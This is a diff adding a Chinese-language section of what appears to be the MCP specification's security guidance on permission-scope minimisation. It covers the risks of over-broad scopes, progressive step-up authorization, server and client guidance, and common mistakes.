+- 审计噪声：单一、包揽所有权限的范围掩盖每次操作的用户意图
+- 权限串联：攻击者无需进一步的提升提示，就能立即调用高风险工具
+- 放弃同意：用户可能拒绝列出过多权限范围的对话框
+- 对权限膨胀失察：缺乏度量指标，使权限请求过宽逐渐被视为常态
+
+#### 缓解措施
+
+实现渐进式、最小权限的权限范围模型：
+
+- 最小的初始权限范围集合，例如 `mcp:tools-basic`，只包含低风险的发现／读取操作
+- 首次尝试高权限操作时，通过针对性的 `WWW-Authenticate` `scope="..."` 质询逐步提升权限
+- 兼容权限缩减：服务器应接受权限范围减少的令牌；授权服务器可以签发所请求权限范围的子集
+
+服务器指导：
+
+- 发出精确的权限范围质询，避免返回完整目录
+- 使用关联 ID 记录提升事件，包括请求的范围和实际授予的子集
+
+服务器可以灵活决定包含哪些权限范围：
+
+- **最小方案**：只包含触发错误的具体操作所需的权限范围。
+- **推荐方案**：包含当前操作所需的权限范围，以及通常一起使用的相关范围，减少逐步提升授权的轮次。
+- **扩展方案**：包含当前操作所需的权限范围、相关范围，以及服务器预计客户端近期可能需要的其他范围。
+
+具体选择取决于服务器对用户体验影响和授权阻力的评估。
+
+客户端指导：
+
+- 开始时只请求基线权限范围，或初始 `WWW-Authenticate` 指定的范围
+- 缓存近期失败，避免对被拒绝的权限范围反复进入提升循环
+
+初始 `WWW-Authenticate` 质询未携带 `scope` 参数时，[权限范围选择策略](/specification/2026-07-28/basic/authorization#scope-selection-strategy)要求客户端回退到请求 `scopes_supported` 中列出的所有范围。这一方案考虑到 MCP Client 的通用性：它们通常缺乏领域专用知识，难以对单个权限范围作出充分判断。请求全部可用范围后，由授权服务器和最终用户在同意过程中确定合适权限，在遵循最小权限原则的同时减少用户操作阻力。
+
+<Note>
+  跨操作累积权限范围是客户端的责任。按照[逐步提升授权流程](/specification/2026-07-28/basic/authorization#step-up-authorization-flow)，客户端在发起重新授权时，**应当**计算先前请求的范围与新质询范围的并集。这样，服务器无需维护客户端权限范围集合的状态，客户端也不会丢失先前获得的权限。
+</Note>
+
+<Note>
+  **分层权限范围**：一些授权服务器定义了权限范围层级，较宽范围隐含较窄范围，例如 `admin` 范围包含 `read`。客户端累积权限范围时，并集可能出现语义冗余。例如，先前已授予较宽范围的令牌，可能又收到一个它已隐含包含的较窄范围质询。客户端无需按层级去重；授权服务器通常会在签发令牌时规范化这些冗余。服务器判断令牌是否足以执行某项操作时，必须考虑层级，但这不影响它在质询中发出的权限范围。
+</Note>
+
+#### 常见错误
+
+- 在 `scopes_supported` 中公开所有可能的权限范围
+- 使用通配符或包揽所有权限的范围，例如 `*`、`all`、`full-access`
+- 为预先避免未来提示，把无关权限捆绑在一起
+- 每次质询都返回完整的权限范围目录
+- 在没有版本管理的情况下，悄然改变权限范围语义
+- 没有服务器端授权逻辑，就将令牌声称的权限范围视为充分授权
+
+正确实施最小化，可以限制失陷影响、提高审计清晰度，并减少反复征求同意带来的负担。
